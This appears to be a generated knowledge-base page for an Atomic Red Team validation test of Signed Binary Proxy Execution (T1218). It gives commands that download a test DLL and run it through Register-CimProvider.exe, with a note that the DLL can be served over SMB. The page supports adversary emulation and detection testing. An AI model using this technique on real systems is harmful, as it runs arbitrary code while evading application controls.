---
atomic_guid: "ad2c17ed-f626-4061-b21e-b9804a6f3655"
title: "Register-CimProvider - Execute evil dll"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218"
attack_technique_name: "Signed Binary Proxy Execution"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "ad2c17ed-f626-4061-b21e-b9804a6f3655"
  - "Register-CimProvider - Execute evil dll"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Register-CimProvider - Execute evil dll

Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB

## Metadata

- Atomic GUID: ad2c17ed-f626-4061-b21e-b9804a6f3655
- Technique: T1218: Signed Binary Proxy Execution
- Platforms: windows
- Executor: command_prompt
- Dependency Executor: powershell
- Source Path: atomics/T1218/T1218.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]

## Input Arguments

### dll_payload

- description: DLL to execute
- type: path
- default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll

## Dependencies

T1218-2.dll must exist on disk at specified location (#{dll_payload})

### Prerequisite Check

```text
if (Test-Path "#{dll_payload}") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory (split-path "#{dll_payload}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
```

## Executor

- name: command_prompt

### Command

```commandprompt
C:\Windows\SysWow64\Register-CimProvider.exe -Path "#{dll_payload}"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.yaml)
